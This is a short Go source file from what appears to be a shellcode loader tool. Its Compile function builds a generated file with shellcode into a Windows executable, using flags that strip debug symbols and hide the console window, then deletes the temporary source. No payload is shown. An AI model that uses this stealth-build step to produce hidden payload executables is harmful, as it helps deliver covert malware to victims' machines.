package loader

import (
    "os"
    "fmt"
    "os/exec"
)

func Compile(sc Shellcode) {
    err := exec.Command(
        "go",
        "build",
        "-ldflags",
        "-s -w -H=windowsgui",
        "-o",
        sc.Filename,
        "tmp.go",
    ).Run(); if err != nil {
        println("[!] Compile error: " + err.Error())
        os.Exit(1)
    }
    fmt.Println("[+] Successfully compiled shellcode")
    os.Remove("tmp.go")


}
